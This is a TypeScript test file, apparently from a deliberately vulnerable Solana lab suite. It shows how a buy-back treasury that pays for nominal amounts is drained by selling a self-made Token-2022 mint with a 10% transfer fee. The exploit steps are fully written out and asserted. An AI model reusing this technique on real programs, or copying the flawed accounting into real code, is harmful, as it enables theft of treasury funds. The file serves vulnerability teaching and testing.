/**
 * VULN 18 — Token-2022 transfer fee vs. nominal accounting.
 *
 * `sell` pays lamports for the NOMINAL instruction amount, but with a
 * Token-2022 transfer-fee mint only `amount * (1 - fee)` actually arrives in
 * the treasury. The attacker self-issues a 10%-fee mint and sells it in a
 * loop: every round the treasury SOL vault loses the fee difference until it
 * is drained.
 */
import { assert } from "chai";
import {
  Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ExtensionType, getMintLen,
  createInitializeMint2Instruction, createInitializeTransferFeeConfigInstruction,
  createMint, createAccount, mintTo, getAccount,
} from "@solana/spl-token";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  solBalance, BN,
} from "./util";

describe("vuln18 token-2022 transfer fee drains the buy-back treasury", () => {
  const program = anchorProgram("vuln18_token2022", PROG_IDS.vuln18);
  const vault = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln18)[0];

  let attacker: Keypair, honest: Keypair;
  let feeMint: PublicKey, attackerTa: PublicKey;
  let plainMint: PublicKey, honestTa: PublicKey, honestTreasuryTa: PublicKey;
  let vaultBefore = 0;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 60);
    attacker = await newFundedKeypair();
    honest = await newFundedKeypair();

    await program.methods.initialize()
      .accounts({ vault, payer: provider.wallet.publicKey })
      .rpc();

    await program.methods.fund(new BN(1_000_000_000)) // SOL liquidity of the buy-back
      .accounts({ vault, user: provider.wallet.publicKey })
      .rpc();

    // --- attacker's Token-2022 mint with a 10% transfer fee ---------------
    const mintLen = getMintLen([ExtensionType.TransferFeeConfig]);
    const mintRent = await provider.connection.getMinimumBalanceForRentExemption(mintLen);
    const mintAcc = Keypair.generate();
    feeMint = mintAcc.publicKey;
    const initTx = new Transaction().add(
      SystemProgram.createAccount({
        fromPubkey: provider.wallet.publicKey,
        newAccountPubkey: feeMint,
        space: mintLen,
        lamports: mintRent,
        programId: TOKEN_2022_PROGRAM_ID,
      }),
      createInitializeTransferFeeConfigInstruction(
        feeMint, provider.wallet.publicKey, provider.wallet.publicKey, 1000,
        BigInt("18446744073709551615"), TOKEN_2022_PROGRAM_ID,
      ),
      createInitializeMint2Instruction(feeMint, 6, provider.wallet.publicKey, null, TOKEN_2022_PROGRAM_ID),
    );
    await sendAndConfirmTransaction(provider.connection, initTx, [provider.wallet.payer, mintAcc]);

    attackerTa = await createAccount(
      provider.connection, provider.wallet.payer, feeMint, attacker.publicKey,
      undefined, undefined, TOKEN_2022_PROGRAM_ID,
    );
    await mintTo(
      provider.connection, provider.wallet.payer, feeMint, attackerTa,
      provider.wallet.publicKey, 2_000_000, [], undefined, TOKEN_2022_PROGRAM_ID,
    );
    assert.equal((await getAccount(provider.connection, attackerTa, undefined, TOKEN_2022_PROGRAM_ID)).amount, 2_000_000n);
  });

  it("honest mint (no fee) is accounted correctly", async () => {
    plainMint = await createMint(provider.connection, provider.wallet.payer,
      provider.wallet.publicKey, null, 6);
    honestTa = await createAccount(provider.connection, provider.wallet.payer, plainMint, honest.publicKey);
    const honestTreasuryTa = await createAccount(provider.connection, provider.wallet.payer,
      plainMint, vault, Keypair.generate());
    await mintTo(provider.connection, provider.wallet.payer, plainMint, honestTa,
      provider.wallet.publicKey, 1_000_000);

    const vaultSolBefore = await solBalance(vault);
    await program.methods.sell(new BN(1_000_000))
      .accounts({
        vault, treasuryTa: honestTreasuryTa, mint: plainMint, sellerTa: honestTa,
        seller: honest.publicKey, tokenProgram: TOKEN_PROGRAM_ID,
        vaultAuthority: vault,
      })
      .signers([honest]).rpc();

    // 1:1 rate: treasury paid exactly the nominal amount it received.
    assert.equal((await solBalance(vault)) - vaultSolBefore, -1_000_000);
    assert.equal((await getAccount(provider.connection, honestTreasuryTa)).amount, 1_000_000n);
  });

  it("fee mint: treasury receives 10% less but pays the nominal price", async () => {
    const attackerTreasuryTa = await createAccount(provider.connection, provider.wallet.payer,
      feeMint, vault, Keypair.generate(), undefined, TOKEN_2022_PROGRAM_ID);

    vaultBefore = await solBalance(vault);
    const attackerBefore = await solBalance(attacker.publicKey);

    // Two rounds of selling 1_000_000 units at the nominal 1:1 rate.
    for (let i = 0; i < 2; i++) {
      await program.methods.sell(new BN(1_000_000))
        .accounts({
          vault, treasuryTa: attackerTreasuryTa, mint: feeMint, sellerTa: attackerTa,
          seller: attacker.publicKey, tokenProgram: TOKEN_2022_PROGRAM_ID,
          vaultAuthority: vault,
        })
        .signers([attacker]).rpc();
    }

    // Attacker got the FULL 2_000_000 lamports.
    assert.isAtLeast(
      (await solBalance(attacker.publicKey)) - attackerBefore, 2_000_000 - 10_000);

    // ...while the treasury only holds 1_800_000 of the 2_000_000 "bought".
    assert.equal(
      (await getAccount(provider.connection, attackerTreasuryTa, undefined, TOKEN_2022_PROGRAM_ID)).amount,
      1_800_000n);

    // SOL vault paid 2_000_000 for tokens worth 1_800_000 -> net theft of 200_000.
    assert.equal(vaultBefore - (await solBalance(vault)), 2_000_000);
  });
});
